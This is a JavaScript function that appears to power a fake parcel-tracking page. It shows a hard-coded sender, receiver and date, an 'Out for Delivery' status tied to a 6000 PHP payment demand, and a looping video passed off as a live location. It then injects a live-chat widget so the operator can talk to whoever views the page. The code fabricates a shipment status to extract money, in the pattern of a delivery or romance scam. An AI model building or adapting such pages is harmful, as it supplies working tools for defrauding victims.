function handle34919110LXVN(resultElement) {
    let result = {
        sender: 'Ceng Yung',
        country: 'Scotland',
        receiver: 'Anj Duran',
        date: 'June 14, 2025',
        location: 'Out for Delivery - Area. Within 48 hours package would get to destined country- pending payment 6000 PHP'
    };

    // Display the result
    resultElement.innerHTML = `
        <p>SENDER NAME: ${result.sender}</p>
        <p>SENDER ADDRESS: ${result.country}</p>
        <p>RECIEVERS NAME : ${result.receiver}</p>
        <p>DATE: ${result.date}</p>
                <p><video id="local" 
                src="live.mp4" autoplay muted loop></video>           Live Location: ${result.location}</p>`;

    // Inject the LiveChat script danielpannet12@gmail.com
    const livechatScript = document.createElement('script');
    livechatScript.src = "//code.tidio.co/db9qna6kduweptrewltxrvcsgs5osquu.js";
    livechatScript.async = true;
    document.body.appendChild(livechatScript);
}



